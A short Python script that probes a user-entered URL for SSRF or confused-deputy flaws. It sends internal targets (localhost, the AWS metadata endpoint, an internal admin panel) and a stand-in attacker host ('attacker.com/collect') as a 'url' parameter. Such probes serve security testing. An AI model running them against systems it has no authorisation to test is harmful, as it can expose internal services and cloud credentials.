import requests

# List of test payloads to check for SSRF or proxy misbehavior
test_urls = [
    "http://localhost:80",  # Internal service access
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata API
    "http://internal-service.local/admin",  # Internal admin panel
    "http://attacker.com/collect"  # Attacker-controlled endpoint
]

def check_confused_deputy(target_url):
    print(f"[*] Checking for Confused Deputy vulnerability on: {target_url}")

    for test_url in test_urls:
        payload = {"url": test_url}  # Assuming a vulnerable API accepts a "url" parameter
        response = requests.get(target_url, params=payload)

        if response.status_code == 200 and "root" in response.text.lower():
            print(f"[!] Possible vulnerability! Target fetched {test_url}.")
        elif response.status_code == 200:
            print(f"[+] Target responded to {test_url}, manual review needed.")
        else:
            print(f"[-] {test_url} returned {response.status_code}")

# Get user input
target_url = input("Enter the target URL (e.g., https://example.com/api/fetch): ")
check_confused_deputy(target_url)
